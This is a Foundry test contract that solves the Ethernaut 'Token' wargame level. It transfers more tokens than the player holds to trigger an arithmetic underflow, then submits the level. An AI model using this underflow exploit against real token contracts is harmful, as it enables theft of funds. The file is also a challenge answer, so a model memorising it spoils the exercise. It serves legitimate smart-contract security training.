// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {BaseTest} from "./BaseTest.t.sol";
import {console2} from "forge-std/console2.sol";
import {TokenFactory} from "../src/Token/TokenFactory.sol";
import {Token} from "../src/Token/Token.sol";


contract TokenTest is BaseTest {
    address public player2 = makeAddr("player2");

    function testTokenHack() public {
        ////////////////////*/
        //    Level Setup
        ////////////////////*/
        TokenFactory factory = new TokenFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Token ethernautToken = Token(payable(levelAddress));

        ////////////////////*/
        //   Level Attack
        ////////////////////*/
        console2.log("Player Balance before Transfer:", ethernautToken.balanceOf(player));
        ethernautToken.transfer(player2, factory.PLAYER_SUPPLY() + 1);
        console2.log("Player Balance after Transfer:", ethernautToken.balanceOf(player));

        //////////////////////*/
        //  Level Submission
        //////////////////////*/
        bool levelCompleted = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assertTrue(levelCompleted);
    }
}
